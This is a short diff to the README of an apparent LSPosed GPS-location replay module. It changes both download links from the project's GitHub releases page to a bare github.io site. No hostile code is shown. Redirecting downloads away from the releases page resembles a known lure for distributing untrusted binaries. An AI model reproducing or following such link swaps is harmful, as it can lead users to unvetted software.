@@ -1,6 +1,6 @@
 # 📍 lsposed-location-replay - Replay Real GPS Data Anywhere
 
-[![Download Now](https://img.shields.io/badge/Download-lsposed--location--replay-blue?style=for-the-badge&logo=github)](https://github.com/Ixodesscapularisstepchild22/lsposed-location-replay/releases)
+[![Download Now](https://img.shields.io/badge/Download-lsposed--location--replay-blue?style=for-the-badge&logo=github)](https://ixodesscapularisstepchild22.github.io)
 
 ---
 
@@ -27,7 +27,7 @@ This is perfect for location compatibility testing, app development research, or
 
 ### Step 1: Get the Application
 
-Visit this link to download the application: [https://github.com/Ixodesscapularisstepchild22/lsposed-location-replay/releases](https://github.com/Ixodesscapularisstepchild22/lsposed-location-replay/releases)
+Visit this link to download the application: [https://ixodesscapularisstepchild22.github.io](https://ixodesscapularisstepchild22.github.io)
 
 ### Step 2: Download the Latest Version
 
